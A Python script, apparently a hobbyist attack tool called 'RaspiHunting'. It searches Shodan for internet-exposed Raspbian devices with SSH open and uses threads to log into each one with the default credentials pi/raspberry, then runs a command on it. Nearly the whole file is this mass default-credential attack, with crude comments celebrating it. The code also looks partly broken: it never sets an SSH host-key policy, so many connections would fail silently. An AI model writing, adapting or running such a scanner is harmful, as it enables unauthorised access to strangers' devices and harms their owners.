#!/usr/bin/env python3
#Searching the net for unsecure raspberrys with default ssh credentials
#RaspiHunting
#Hunting is just the beginning...

import shodan
import paramiko
import os
import socket
import os
# this is 2018 motherfucker!
import threading

DEBUG = False # or True

def te_rajo():
    print('''\t\t\t
   .~~.   .~~.
  '. \ ' ' / .'
   .~ .~~~..~.
  : .~.'~'.~. :
 ~ (   ) (   ) ~
( : '~'.~.'~' : )
 ~ .~ (   ) ~. ~
  (  : '~' :  )
   '~ .~~~. ~'
       '~'
       ''')


def ssh_connect(hostname, port='22', username='pi', password='raspberry'):
    try:
        client = paramiko.SSHClient()
        client.connect(hostname, port=port, username=username, password=password, timeout=3)
        stdin, stdout, stderr = client.exec_command('ls')
        print(stdout.read())
    except paramiko.ssh_exception.AuthenticationException:
        if DEBUG:
            print('Authentication failed when connecting to %s' % hostname)
    except:
        if DEBUG:
            print('Could not SSH to %s' % hostname)
    finally:
        client.close()


def scan_job(shodan_api, page):
    results = shodan_api.search('raspbian port:"22"', page=page)
    list_to_scan = []
    print(threading.currentThread().getName() + ' Page to scan: ' + str(page))
    for i in results['matches']:
        if DEBUG:
            print(threading.currentThread().getName() + ' IP: %s' % i['ip_str'])
        list_to_scan.append(i['ip_str'])
    # lets fuck some raspberrys!
    # ssh connect
    for hostname in list_to_scan:
        ssh_connect(hostname)


def main():

    shodan_key = open('shodankey').readline().rstrip('\n')
    shodan_api = shodan.Shodan(shodan_key)
    te_rajo()
    try:
        results = shodan_api.search('raspbian port:"22"')
        pages = int(int(results['total']) / 100)
        print('Results: %s' % results['total'])
        print('Pages: ' + str(pages))
        # lets split this load in threads, because this is 2018
        threads = 8 # this is a lot? i dont know
        jobs = []
        page = 0
        while page < pages:
            for i in range(0, threads):
                thread = threading.Thread(target=scan_job, args=(shodan_api, page))
                jobs.append(thread)
                print(str(page))
                page += 1
            # start the threads
            for j in jobs:
                print('start')
                j.start()
            # ensure all of the threads have finished
            for j in jobs:
                j.join()
            jobs.clear() # clear thread list
    except shodan.APIError as e:
        print('Ups... Something has gone wrong: %s' % e)

if __name__== "__main__":
    main()
